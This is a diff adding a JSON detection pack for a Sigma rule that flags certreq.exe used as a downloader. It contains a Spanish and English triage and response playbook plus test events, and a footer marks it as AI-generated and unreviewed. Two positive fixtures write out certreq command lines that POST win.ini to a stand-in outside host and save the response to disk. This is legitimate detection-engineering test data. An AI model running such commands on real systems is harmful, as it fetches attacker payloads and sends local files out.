@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "4480827a-9799-4232-b2c4-ccc6c4e9e12b",
+    "title": "Suspicious CertReq Command to Download",
+    "level": "high",
+    "status": "experimental",
+    "author": "Christian Burkard (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_certreq_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_certreq_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó certreq.exe con -Post, -config y una URL HTTP. Así se usa esta herramienta de certificados como descargador: envía un POST a un servidor remoto y guarda la respuesta en disco.",
+      "what_it_detects": "Procesos de certreq.exe, identificados por Image u OriginalFileName, cuya CommandLine incluye -Post y -config (también con /, – o —) y la cadena http.",
+      "why_it_matters": "Certreq es un binario firmado de Windows y puede servir para traer payloads o configuración desde un servidor del atacante sin herramientas adicionales. Corresponde a ATT&CK T1105, Ingress Tool Transfer, y también permite exfiltrar el archivo que se envía.",
+      "triage_steps": [
+        "Revise la CommandLine completa: anote la URL de -config, el archivo enviado como solicitud y el archivo de salida donde se guarda la respuesta.",
+        "Evalúe el dominio o la IP de la URL: reputación, antigüedad, uso de IP directa y si pertenece a una CA o PKI interna conocida.",
+        "Identifique el ParentImage y la cadena de procesos; un padre como cmd.exe, powershell.exe, wscript.exe u Office es más sospechoso.",
+        "Revise el usuario, el host y los procesos creados en el mismo equipo en una ventana de +/- 15 minutos, sobre todo los que lean o ejecuten el archivo de salida.",
+        "Busque el archivo de salida en el endpoint, obtenga su hash y analice su contenido sin ejecutarlo.",
+        "Revise las conexiones de red y los registros de proxy o DNS hacia la URL, y busque otros hosts que la hayan contactado.",
+        "Busque alertas anteriores del mismo usuario, host o destino."
+      ],
+      "false_positives": [
+        "Es poco probable. Un script de administración de PKI o una prueba de inscripción contra un servidor web de CA interno podría coincidir; confirme con el equipo de PKI.",
+        "Ejercicios autorizados de red team o pruebas de detección con Atomic Red Team o herramientas similares."
+      ],
+      "response_steps": [
+        "Confirme si la ejecución estaba autorizada con el dueño del host o con el equipo de PKI.",
+        "Si es maliciosa, aísle el endpoint y bloquee el dominio o la IP de la URL en el proxy, el firewall y el DNS.",
+        "Conserve el archivo descargado y los artefactos relacionados, y luego elimine el payload y cualquier persistencia asociada.",
+        "Si hay indicios de compromiso, restablezca las credenciales del usuario involucrado.",
+        "Busque los mismos indicadores en toda la flota y restaure el host desde una imagen confiable si fue comprometido."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque combinar -Post, -config y una URL HTTP en certreq casi nunca es legítimo y suele indicar descarga de herramientas."
+    },
+    "en": {
+      "summary": "certreq.exe ran with -Post, -config and an HTTP URL. That is how this certificate tool is used as a downloader: it POSTs to a remote server and writes the response to disk.",
+      "what_it_detects": "certreq.exe processes, matched by Image or OriginalFileName, whose CommandLine contains -Post and -config (also with /, – or — as the dash) and the string http.",
+      "why_it_matters": "Certreq is a signed Windows binary, so attackers can use it to pull payloads or configuration from their server without extra tools. This maps to ATT&CK T1105, Ingress Tool Transfer. It can also exfiltrate the file it sends.",
+      "triage_steps": [
+        "Read the full CommandLine. Note the -config URL, the file sent as the request and the output file where the response is saved.",
+        "Assess the URL's domain or IP: reputation, age, raw-IP use, and whether it belongs to a known internal CA or PKI.",
+        "Identify the ParentImage and the process chain. Parents such as cmd.exe, powershell.exe, wscript.exe or Office apps raise suspicion.",
+        "Check the user and host. Review processes on the same host within +/- 15 minutes, especially any that read or run the output file.",
+        "Find the output file on the endpoint, hash it and inspect its content without running it.",
+        "Review network connections and proxy or DNS logs for the URL, and look for other hosts that contacted it.",
+        "Search for earlier alerts on the same user, host or destination."
+      ],
+      "false_positives": [
+        "Unlikely. A PKI admin script or an enrollment test against an internal CA web server could match; confirm with the PKI team.",
+        "Authorized red team exercises or detection tests with Atomic Red Team or similar tools."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or the PKI team whether the run was authorized.",
+        "If it is malicious, isolate the endpoint and block the URL's domain or IP at the proxy, firewall and DNS.",
+        "Preserve the downloaded file and related artifacts, then remove the payload and any persistence.",
+        "Reset the involved user's credentials if there are signs of compromise.",
+        "Hunt for the same indicators across the fleet and reimage the host from a trusted image if it was compromised."
+      ],
+      "severity_rationale": "High fits because certreq with -Post, -config and an HTTP URL together is almost never legitimate and usually means tool transfer."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "certreq.exe started from cmd.exe; it POSTs win.ini to an external URL and saves the response as a file",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.local",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certreq.exe",
+          "OriginalFileName": "CertReq.exe",
+          "CommandLine": "certreq.exe -Post -config https://files.example.com/update.bin C:\\Windows\\win.ini C:\\Users\\jperez\\AppData\\Local\\Temp\\update.bin",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "Copy of certreq renamed to a different file name (matched through OriginalFileName), using slash-style flags and a plain HTTP URL to a documentation-range IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0217.andes.local",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\ProgramData\\svc\\certutil32.exe",
+          "OriginalFileName": "CertReq.exe",
+          "CommandLine": "certutil32.exe /post /config http://203.0.113.45/cfg C:\\Windows\\win.ini C:\\ProgramData\\svc\\cfg.dat",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\ProgramData\\svc\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Normal certificate request submitted to an internal CA. There is no -Post flag and no http URL.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-WEB01.andes.local",
+          "User": "ANDES\\adm_pki",
+          "Image": "C:\\Windows\\System32\\certreq.exe",
+          "OriginalFileName": "CertReq.exe",
+          "CommandLine": "certreq.exe -submit -config \"CA01.andes.local\\ANDES-Issuing-CA\" C:\\pki\\web01.req C:\\pki\\web01.cer",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CurrentDirectory": "C:\\pki\\"
+        }
+      },
+      {
+        "description": "Web enrollment against an internal enrollment service. It has -config and an https URL but uses -submit instead of -Post.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0300.andes.local",
+          "User": "ANDES\\adm_pki",
+          "Image": "C:\\Windows\\System32\\certreq.exe",
+          "OriginalFileName": "CertReq.exe",
+          "CommandLine": "certreq.exe -submit -config \"https://ces.example.org/ANDES-CA_CES_Kerberos/service.svc/CES\" C:\\pki\\user.req",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\pki\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
